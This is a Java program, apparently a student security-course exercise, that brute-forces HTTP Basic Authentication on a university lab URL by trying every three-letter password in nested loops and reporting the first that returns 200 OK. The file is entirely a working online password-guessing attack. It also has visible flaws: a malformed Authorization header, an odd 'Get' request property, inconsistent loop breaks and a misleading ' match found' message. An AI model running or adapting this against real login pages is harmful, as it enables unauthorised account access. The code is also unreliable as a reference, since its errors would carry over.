
import java.net.*;
import java.io.*;


public class BruteForce {

  public static void main(String args[])
  {
  int i,j,k;
  String pass = new String();
  String UserPass = new String();
  String status = new String();
  String status1 = new String();
  BasicAuth auth = new BasicAuth();
  URLConnection  connect;
   int start,end,diff;

  try {
               URL url = new URL ("http://sec-crack.cs.rmit.edu./SEC/2/");

           start  =System.currentTimeMillis();


              DataInputStream dis ;

      for (i=0;i<=58;i++)
      {

        for (j=0;j<=58;j++)
        {

          for (k=1;k<=58;k++)
          {

           


            if (i !=0)
            {


              pass = "" + (char)(k+64) + (char)(j+65) + (char)(i+64);

              if ((i+64) >=91 && (i+64) <=96)
              break;

               if ((j+65) >=91 && (j+65) <=96)
              break;

               if ((k+64) >=91 && (k+64) <=96)
              continue;


              UserPass= auth.encode("",pass);

              connect = url.openConnection();
              connect.setDoInput(true);
              connect.setDoOutput(true);

              connect.setRequestProperty("Host","sec-crack.cs.rmit.edu.");
              connect.setRequestProperty("Get","/SEC/2/ HTTP/1.1");
              connect.setRequestProperty("Authorization"," " + UserPass);
              connect.connect();

              status =connect.getHeaderField(0);
              status1 = status.substring( 9,12);

              if (status.equalsIgnoreCase("HTTP/1.1 200 OK"))
              {
              System.out.println("Password is " + pass);
              end=System.currentTimeMillis();
              diff= end - start;
              System.out.println("Time Taken = " + (diff/1000) + " sec" );
              System.exit(0);
              }
              ((HttpURLConnection)connect).disconnect();
              connect = null;
            }




          }
        }
      }

      System.out.println(" match found");
      connect = null;

     }

    catch (MalformedURLException malerr)
  {
  System.err.println("Unable  Open URL" + malerr);
  }

  catch (Exception ioerr)
  {
  System.err.println("Unable  retrive URL" + ioerr);
  }




  }
}